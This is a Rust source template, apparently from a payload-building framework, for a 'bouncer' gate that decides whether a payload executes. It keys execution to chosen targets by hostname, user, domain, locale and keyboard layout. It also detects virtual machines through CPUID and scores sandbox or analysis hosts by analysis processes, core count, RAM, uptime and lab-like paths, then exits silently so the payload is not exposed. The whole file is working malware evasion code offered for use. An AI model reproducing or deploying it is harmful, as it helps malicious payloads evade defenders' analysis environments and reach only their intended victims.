// --- Bouncer (technique fragment) ---

use windows::core::PWSTR;
use windows::Win32::Foundation::{CloseHandle, GetLastError, HMODULE};
use windows::Win32::Globalization::GetUserDefaultLocaleName;
use windows::Win32::System::Diagnostics::ToolHelp::{
    CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, PROCESSENTRY32W, TH32CS_SNAPPROCESS,
};
use windows::Win32::System::LibraryLoader::GetModuleFileNameW;
use windows::Win32::System::SystemInformation::{
    ComputerNameDnsDomain, GetComputerNameExW, GetSystemInfo, GetTickCount64, GlobalMemoryStatusEx,
    MEMORYSTATUSEX, SYSTEM_INFO,
};
use windows::Win32::System::WindowsProgramming::{GetComputerNameW, GetUserNameW};
use windows::Win32::UI::Input::KeyboardAndMouse::{
    GetKeyboardLayout, GetKeyboardLayoutList, GetKeyboardLayoutNameW, HKL,
};

/// Whether every declared check must pass (`true`) or at least one (`false`).
const MODE_ALL: bool = $MODE_ALL$;
/// Whether a rejected host exits with code 1 (`true`) or silently (`false`).
const ON_FAIL_EXIT: bool = $ON_FAIL_EXIT$;
/// Whether the host must not be a hypervisor guest.
const REQUIRE_NOT_VM: bool = $REQUIRE_NOT_VM$;
/// Whether the host must not look like an analysis environment.
const REQUIRE_NOT_ANALYSIS_ENV: bool = $REQUIRE_NOT_ANALYSIS_ENV$;

/// Number of environment indicators that must coincide before the aggregate
/// heuristic reports a sandbox-like host. Deliberately conservative (3): a
/// false negative lets the payload run where it should have been blocked, while
/// a false positive blocks a legitimate target. This is the documented tradeoff
/// of the technique.
const ENV_SCORE_THRESHOLD: u32 = 3;
/// Processor count below which a host looks like a sandbox.
const ENV_MIN_CORES: u32 = 2;
/// Physical memory (MiB) below which a host looks like a sandbox.
const ENV_MIN_RAM_MB: u64 = 2048;
/// Uptime (minutes) below which a host looks like a sandbox.
const ENV_MIN_UPTIME_MIN: u64 = 10;

/// Errors produced while reading the host environment.
///
/// The numeric payload carries the failing Win32 error, or the API's own return
/// value when it does not set one.
#[derive(Debug, thiserror::Error)]
pub enum BouncerError {
    #[error("could not read the computer name (error {0})")]
    ComputerNameFailed(u32),
    #[error("could not read the user name (error {0})")]
    UserNameFailed(u32),
    #[error("could not read the DNS domain (error {0})")]
    DomainFailed(u32),
    #[error("could not read the user locale (error {0})")]
    LocaleFailed(u32),
    #[error("could not read the active keyboard layouts (error {0})")]
    KeyboardFailed(u32),
    #[error("the CPU does not report a usable hypervisor leaf")]
    CpuIdFailed,
    #[error("could not enumerate the running processes (error {0})")]
    ProcessEnumerationFailed(u32),
    #[error("could not query the physical memory (error {0})")]
    MemoryQueryFailed(u32),
}

/// Gate entry point: evaluates the declared checks and returns `false` when the
/// pipeline must abort (so the payload is not run).
///
/// With no declared check this is a no-op and returns `true`. When
/// `ON_FAIL_EXIT` is set, a rejection exits the process with code 1 instead of
/// letting the template exit silently.
pub fn bouncer() -> Result<bool, BouncerError> {
    // Declared checks. Each is `None`/empty when the YAML did not set it.
    let hostname_pattern: Option<String> = $HOSTNAME_DEF$;
    let username_pattern: Option<String> = $USERNAME_DEF$;
    let domain_pattern: Option<String> = $DOMAIN_DEF$;
    let languages: Vec<String> = $LANGUAGE_DEF$;
    let keyboards: Vec<String> = $KEYBOARD_DEF$;
    let env_processes: Vec<String> = $ANALYSIS_PROCESSES_DEF$;
    let env_tokens: Vec<String> = $ANALYSIS_PATH_TOKENS_DEF$;
    let vendor_tokens: Vec<String> = $VENDOR_TOKENS_DEF$;
    let min_uptime: Option<u32> = $MIN_UPTIME_DEF$;
    let min_ram: Option<u32> = $MIN_RAM_DEF$;

    let mut declared: u32 = 0;
    let mut passed: u32 = 0;

    if let Some(pattern) = hostname_pattern.as_ref() {
        declared += 1;
        if glob_match(pattern, &computer_name()?) {
            passed += 1;
        }
    }

    if let Some(pattern) = username_pattern.as_ref() {
        declared += 1;
        if glob_match(pattern, &user_name()?) {
            passed += 1;
        }
    }

    if let Some(pattern) = domain_pattern.as_ref() {
        declared += 1;
        if glob_match(pattern, &dns_domain()?) {
            passed += 1;
        }
    }

    if !languages.is_empty() {
        declared += 1;
        let locale = locale_name()?;
        if languages
            .iter()
            .any(|accepted| accepted.eq_ignore_ascii_case(&locale))
        {
            passed += 1;
        }
    }

    if !keyboards.is_empty() {
        declared += 1;
        let active = keyboard_layouts()?;
        let matched = active.iter().any(|layout| {
            keyboards
                .iter()
                .any(|accepted| normalize_klid(accepted) == *layout)
        });
        if matched {
            passed += 1;
        }
    }

    if REQUIRE_NOT_VM {
        declared += 1;
        if !hypervisor_vendor_present(&vendor_tokens)? {
            passed += 1;
        }
    }

    if REQUIRE_NOT_ANALYSIS_ENV {
        declared += 1;
        if env_score(&env_processes, &env_tokens)? < ENV_SCORE_THRESHOLD {
            passed += 1;
        }
    }

    if let Some(minimum) = min_uptime {
        declared += 1;
        if uptime_minutes() >= minimum as u64 {
            passed += 1;
        }
    }

    if let Some(minimum) = min_ram {
        declared += 1;
        if total_ram_mb()? >= minimum as u64 {
            passed += 1;
        }
    }

    let accepted = if declared == 0 {
        // No check declared: the gate cannot reject the host.
        true
    } else if MODE_ALL {
        passed == declared
    } else {
        passed > 0
    };
    crate::tech_dbg!(
        "bouncer",
        "{passed}/{declared} check(s) passed (mode all: {MODE_ALL})"
    );

    if accepted {
        crate::tech_dbg!("bouncer", "host accepted");
        return Ok(true);
    }
    crate::tech_dbg!("bouncer", "host rejected (exit on fail: {ON_FAIL_EXIT})");

    // Rejected. `exit` leaves an explicit signal; `silent` lets the template
    // exit with code 0 and no reason behind it.
    if ON_FAIL_EXIT {
        std::process::exit(1);
    }
    Ok(false)
}

/// Case-insensitive glob match supporting `*` (any run) and `?` (one char).
///
/// A pattern without wildcards degenerates to an exact case-insensitive
/// comparison, which is the documented behaviour for `hostname`, `username` and
/// `domain`.
fn glob_match(pattern: &str, text: &str) -> bool {
    let pattern: Vec<char> = pattern.to_lowercase().chars().collect();
    let text: Vec<char> = text.to_lowercase().chars().collect();

    let mut p = 0usize;
    let mut t = 0usize;
    let mut star: Option<usize> = None;
    let mut resume = 0usize;

    while t < text.len() {
        if p < pattern.len() && (pattern[p] == '?' || pattern[p] == text[t]) {
            p += 1;
            t += 1;
        } else if p < pattern.len() && pattern[p] == '*' {
            star = Some(p);
            resume = t;
            p += 1;
        } else if let Some(star_pos) = star {
            p = star_pos + 1;
            resume += 1;
            t = resume;
        } else {
            return false;
        }
    }

    // Trailing wildcards match the empty remainder.
    while p < pattern.len() && pattern[p] == '*' {
        p += 1;
    }
    p == pattern.len()
}

/// Decodes a NUL-terminated UTF-16 buffer, stopping at the first NUL (or at the
/// end of the buffer when it is not terminated).
fn wide_to_string(buffer: &[u16]) -> String {
    let length = match buffer.iter().position(|&unit| unit == 0) {
        Some(index) => index,
        None => buffer.len(),
    };
    String::from_utf16_lossy(&buffer[..length])
}

/// Reads the computer name (`GetComputerNameW`).
fn computer_name() -> Result<String, BouncerError> {
    let mut buffer = [0u16; 256];
    let mut size = buffer.len() as u32;
    match unsafe { GetComputerNameW(PWSTR(buffer.as_mut_ptr()), &mut size) } {
        Ok(()) => {
            let name = wide_to_string(&buffer);
            crate::tech_dbg!("bouncer", "hostname '{name}'");
            Ok(name)
        }
        Err(error) => Err(BouncerError::ComputerNameFailed(error.code().0 as u32)),
    }
}

/// Reads the user name (`GetUserNameW`).
fn user_name() -> Result<String, BouncerError> {
    let mut buffer = [0u16; 256];
    let mut size = buffer.len() as u32;
    match unsafe { GetUserNameW(PWSTR(buffer.as_mut_ptr()), &mut size) } {
        Ok(()) => {
            let name = wide_to_string(&buffer);
            crate::tech_dbg!("bouncer", "user '{name}'");
            Ok(name)
        }
        Err(error) => Err(BouncerError::UserNameFailed(error.code().0 as u32)),
    }
}

/// Reads the DNS domain name (`GetComputerNameExW(ComputerNameDnsDomain)`).
///
/// A host outside a domain yields an empty string, so a `domain` check then
/// simply fails instead of erroring.
fn dns_domain() -> Result<String, BouncerError> {
    let mut buffer = [0u16; 256];
    let mut size = buffer.len() as u32;
    match unsafe { GetComputerNameExW(ComputerNameDnsDomain, PWSTR(buffer.as_mut_ptr()), &mut size) }
    {
        Ok(()) => Ok(wide_to_string(&buffer)),
        Err(error) => Err(BouncerError::DomainFailed(error.code().0 as u32)),
    }
}

/// Reads the user's default locale (`GetUserDefaultLocaleName`), in BCP-47 form
/// (e.g. `en-US`).
fn locale_name() -> Result<String, BouncerError> {
    // LOCALE_NAME_MAX_LENGTH is 85.
    let mut buffer = [0u16; 85];
    let written = unsafe { GetUserDefaultLocaleName(&mut buffer) };
    if written <= 0 {
        return Err(BouncerError::LocaleFailed(unsafe { GetLastError().0 }));
    }
    let locale = wide_to_string(&buffer);
    crate::tech_dbg!("bouncer", "locale '{locale}'");
    Ok(locale)
}

/// Collects every active keyboard layout as a 4-digit uppercase hex code.
///
/// The code is the low 16 bits of the `HKL` (the language id): `0409` for US,
/// `0C0A` for Spain. Three sources feed the list: `GetKeyboardLayout` for the
/// calling thread, `GetKeyboardLayoutNameW` for its KLID string (trimmed to the
/// last four digits) and `GetKeyboardLayoutList` for every loaded layout.
fn keyboard_layouts() -> Result<Vec<String>, BouncerError> {
    let mut layouts: Vec<String> = Vec::new();

    let current = unsafe { GetKeyboardLayout(0) };
    if !current.is_invalid() {
        layouts.push(format!("{:04X}", current.0 as usize as u16));
    }

    let mut name = [0u16; 9];
    if unsafe { GetKeyboardLayoutNameW(&mut name) }.is_ok() {
        layouts.push(normalize_klid(&wide_to_string(&name)));
    }

    let count = unsafe { GetKeyboardLayoutList(None) };
    if count <= 0 {
        return Err(BouncerError::KeyboardFailed(unsafe { GetLastError().0 }));
    }
    let mut list = vec![HKL(std::ptr::null_mut()); count as usize];
    let filled = unsafe { GetKeyboardLayoutList(Some(&mut list)) };
    if filled <= 0 {
        return Err(BouncerError::KeyboardFailed(unsafe { GetLastError().0 }));
    }
    for hkl in list.iter().take(filled as usize) {
        layouts.push(format!("{:04X}", hkl.0 as usize as u16));
    }

    layouts.sort();
    layouts.dedup();
    Ok(layouts)
}

/// Normalizes a keyboard layout id to an uppercase 4-digit hex code: strips an
/// optional `0x` prefix and keeps the last four digits of the KLID string.
fn normalize_klid(value: &str) -> String {
    let mut text = value.trim().to_ascii_uppercase();
    if let Some(stripped) = text.strip_prefix("0X") {
        text = stripped.to_string();
    }
    if text.len() > 4 {
        text = text[text.len() - 4..].to_string();
    }
    text
}

/// Whether CPUID reports a known hypervisor vendor.
///
/// Uses the standard hypervisor leaves: `CPUID.1:ECX[31]` is the "running under
/// a hypervisor" bit and leaf `0x40000000` returns the 12-byte vendor string.
/// A CPU without the leaf, or one that returns an empty vendor, is reported as
/// [`BouncerError::CpuIdFailed`] rather than assumed to be bare metal.
fn hypervisor_vendor_present(vendor_tokens: &[String]) -> Result<bool, BouncerError> {
    let features = unsafe { core::arch::x86_64::__cpuid(1) };
    if features.ecx & (1 << 31) == 0 {
        // Bare metal: no hypervisor present bit.
        return Ok(false);
    }

    let max_leaf = unsafe { core::arch::x86_64::__cpuid(0) }.eax;
    if max_leaf < 0x4000_0000 {
        return Err(BouncerError::CpuIdFailed);
    }

    let leaf = unsafe { core::arch::x86_64::__cpuid(0x4000_0000) };
    let mut vendor = Vec::with_capacity(12);
    for register in [leaf.ebx, leaf.ecx, leaf.edx] {
        vendor.extend_from_slice(&register.to_le_bytes());
    }
    if vendor.iter().all(|byte| *byte == 0) {
        return Err(BouncerError::CpuIdFailed);
    }

    let vendor = String::from_utf8_lossy(&vendor).to_ascii_lowercase();
    Ok(vendor_tokens
        .iter()
        .any(|token| vendor.contains(&token.to_ascii_lowercase())))
}

/// Aggregate environment heuristic.
///
/// Each indicator contributes one point: a known analysis process running, a
/// low processor count, little physical memory, a short uptime, or a path/user
/// name that reads like a lab. A score at or above [`ENV_SCORE_THRESHOLD`]
/// means "looks like a sandbox".
fn env_score(processes: &[String], tokens: &[String]) -> Result<u32, BouncerError> {
    let mut score = 0u32;

    if env_process_running(processes)? {
        score += 1;
    }
    if cpu_cores() < ENV_MIN_CORES {
        score += 1;
    }
    if total_ram_mb()? < ENV_MIN_RAM_MB {
        score += 1;
    }
    if uptime_minutes() < ENV_MIN_UPTIME_MIN {
        score += 1;
    }
    if path_looks_like_env(tokens) {
        score += 1;
    }

    Ok(score)
}

/// Whether any process in `names` is running, compared by executable stem.
fn env_process_running(names: &[String]) -> Result<bool, BouncerError> {
    let snapshot = match unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) } {
        Ok(handle) => handle,
        Err(error) => return Err(BouncerError::ProcessEnumerationFailed(error.code().0 as u32)),
    };

    let mut entry = PROCESSENTRY32W {
        dwSize: core::mem::size_of::<PROCESSENTRY32W>() as u32,
        ..Default::default()
    };

    let mut found = false;
    if unsafe { Process32FirstW(snapshot, &mut entry) }.is_ok() {
        loop {
            let name = wide_to_string(&entry.szExeFile).to_ascii_lowercase();
            let stem = match name.strip_suffix(".exe") {
                Some(stem) => stem,
                None => name.as_str(),
            };
            if names
                .iter()
                .any(|candidate| stem.eq_ignore_ascii_case(candidate))
            {
                found = true;
                break;
            }
            if unsafe { Process32NextW(snapshot, &mut entry) }.is_err() {
                break;
            }
        }
    }

    let _ = unsafe { CloseHandle(snapshot) };
    Ok(found)
}

/// Whether the image path or the user name contains an environment marker.
fn path_looks_like_env(tokens: &[String]) -> bool {
    let mut haystacks = vec![image_path().to_ascii_lowercase()];
    if let Ok(user) = user_name() {
        haystacks.push(user.to_ascii_lowercase());
    }
    haystacks.iter().any(|haystack| {
        tokens
            .iter()
            .any(|token| haystack.contains(&token.to_ascii_lowercase()))
    })
}

/// The full path of the running image (`GetModuleFileNameW`).
fn image_path() -> String {
    let mut buffer = [0u16; 1024];
    let written = unsafe { GetModuleFileNameW(HMODULE(std::ptr::null_mut()), &mut buffer) };
    let written = (written as usize).min(buffer.len());
    wide_to_string(&buffer[..written])
}

/// Physical processor count (`GetSystemInfo`).
fn cpu_cores() -> u32 {
    let mut info = SYSTEM_INFO::default();
    unsafe { GetSystemInfo(&mut info) };
    info.dwNumberOfProcessors
}

/// Total physical memory in MiB (`GlobalMemoryStatusEx`).
fn total_ram_mb() -> Result<u64, BouncerError> {
    let mut status = MEMORYSTATUSEX {
        dwLength: core::mem::size_of::<MEMORYSTATUSEX>() as u32,
        ..Default::default()
    };
    match unsafe { GlobalMemoryStatusEx(&mut status) } {
        Ok(()) => Ok(status.ullTotalPhys / 1024 / 1024),
        Err(error) => Err(BouncerError::MemoryQueryFailed(error.code().0 as u32)),
    }
}

/// System uptime in minutes (`GetTickCount64`).
fn uptime_minutes() -> u64 {
    (unsafe { GetTickCount64() }) / 60_000
}
